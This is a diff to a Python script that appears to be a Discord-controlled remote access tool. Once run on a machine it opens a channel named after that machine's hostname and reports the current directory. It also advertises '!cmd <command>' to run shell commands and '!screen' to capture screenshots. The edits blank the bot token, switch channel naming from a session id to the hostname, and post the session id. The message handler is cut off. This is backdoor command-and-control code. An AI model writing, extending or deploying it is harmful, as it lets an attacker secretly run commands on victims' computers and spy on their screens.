@@ -1,4 +1,3 @@
-
 # pip install discord pillow pyautogui
 # If not works after installion librares, try pip install discord pillow pyautogui pyscreeze
 
@@ -10,7 +9,7 @@ import os
 import uuid
 
 session = uuid.uuid4()
-TOKEN = "TOKEN" # <---- Bot token discord
+TOKEN = "" # <---- Bot token discord
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -27,9 +26,10 @@ async def on_ready():
     global channel_ref
     guild = client.guilds[0]
     name = get_hostname()
-    channel_ref = await guild.create_text_channel(session)
+    channel_ref = await guild.create_text_channel(name)
     await channel_ref.send(f"✅ Connected: {name}\n📍 Path: `{current_dir}`\n`!cmd <command>` | `!screen` to screenshot.")
     await channel_ref.send("Type !cmd cd .. to go back and !cmd cd (folder_name) to go to another folder.")
+    await channel_ref.send(f"Session: ```{session}```")
 
 @client.event
 async def on_message(message):
